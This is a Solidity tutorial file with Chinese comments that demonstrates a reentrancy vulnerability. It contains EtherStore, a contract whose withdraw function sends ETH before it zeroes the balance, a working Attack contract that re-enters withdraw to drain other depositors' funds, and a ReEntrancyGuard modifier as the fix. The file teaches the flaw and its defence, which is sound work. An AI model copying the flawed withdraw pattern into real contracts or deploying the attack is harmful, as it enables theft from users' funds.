// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

/* 重新入学
漏洞
假设合约 A 调用合约 B。
重入漏洞允许 B 在 A 完成执行之前回调 A。
EtherStore 是一个合约，您可以在其中存入和提取 ETH。
该合约容易受到重入攻击。
让我们看看为什么。
1. 部署 EtherStore
2. 将账户 1 (Alice) 和账户 2 (Bob) 中的 1 Ether 分别存入 EtherStore
3. 使用 EtherStore 地址部署 Attack
4. 调用 Attack.attack 发送 1 个以太币（使用 Account 3 (Eve)）。
    您将获得 3 个以太币（从 Alice 和 Bob 那里偷走 2 个以太币，
    加上从该合约发送的 1 个以太币）。
发生了什么？
Attack 之前可以多次调用 EtherStore.withdraw
EtherStore.withdraw 执行完毕。
以下是函数的调用方式
- 攻击.攻击
- EtherStore.deposit
- EtherStore.withdraw
- 攻击回退（获得 1 以太币）
- EtherStore.withdraw
- Attack.fallback（收到 1 个以太币）
- EtherStore.withdraw
- 攻击回退（获得 1 以太币）
*/

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // 辅助函数检查该合约的余额
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // 当 EtherStore 将 Ether 发送到该合约时，会调用 Fallback。
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // 辅助函数检查该合约的余额
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract ReEntrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}
